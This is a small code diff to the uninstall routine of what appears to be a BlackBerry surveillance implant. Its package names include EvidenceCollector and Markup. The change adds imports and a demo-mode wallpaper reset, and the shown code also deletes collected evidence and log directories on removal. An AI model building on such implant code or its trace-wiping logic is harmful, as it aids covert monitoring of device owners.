@@ -13,6 +13,7 @@ import net.rim.device.api.system.ApplicationDescriptor;
 import net.rim.device.api.system.CodeModuleManager;
 import blackberry.Core;
 import blackberry.Main;
+import blackberry.Messages;
 import blackberry.Singleton;
 import blackberry.Status;
 import blackberry.Trigger;
@@ -22,6 +23,7 @@ import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.EvidenceCollector;
 import blackberry.evidence.Markup;
+import blackberry.fs.AutoFile;
 import blackberry.manager.EventManager;
 import blackberry.manager.ModuleManager;
 import blackberry.utils.Utils;
@@ -168,6 +170,11 @@ public final class UninstallAction extends SubActionMain {
             //#ifdef DEBUG
             Debug.stop();
             //#endif
+            
+            if(Status.getInstance().isDemo()){
+                Main.setWallpaper(false);
+            }
+
             EvidenceCollector.getInstance().removeProgressive();
             Markup.removeMarkups();
             int removed = EvidenceCollector.getInstance().removeLogDirs(
